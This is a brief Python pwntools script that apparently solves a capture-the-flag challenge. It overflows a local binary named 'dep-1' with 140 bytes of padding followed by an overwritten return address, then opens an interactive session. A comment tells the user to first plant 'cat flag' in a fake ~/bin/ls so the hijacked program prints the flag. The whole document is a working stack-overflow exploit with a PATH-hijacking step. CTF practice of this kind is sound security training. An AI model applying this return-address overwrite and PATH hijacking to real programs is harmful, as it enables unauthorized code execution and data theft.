#!/usr/bin/env python

from pwn import *

# make sure you first add "cat flag" to ~/bin/ls

p = process("./dep-1")

buffer = "A"*128 + "abcdefghijkl" + p32(0x08048553) 

p.sendline(buffer)
p.interactive()
